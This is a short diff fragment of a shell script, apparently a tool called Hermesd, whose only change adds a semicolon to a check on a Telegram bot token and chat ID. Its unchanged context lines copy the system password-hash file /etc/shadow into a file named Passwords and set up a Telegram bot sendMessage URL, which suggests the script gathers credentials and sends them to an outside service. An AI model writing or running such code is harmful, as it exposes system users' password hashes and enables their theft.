@@ -11,7 +11,7 @@ URL"https://api.telegram.org/bot$TOKEN/sendMessage"
 
 cat /etc/shadow > /root/tmp/Passwords
 
-if [ -z "$TOKEN" ] || [ -z "$ID" ]
+if [ -z "$TOKEN" ] || [ -z "$ID" ];
 then
        echo "Token and ID empty, edit config file  Hermesd.conf >&2 "
 else
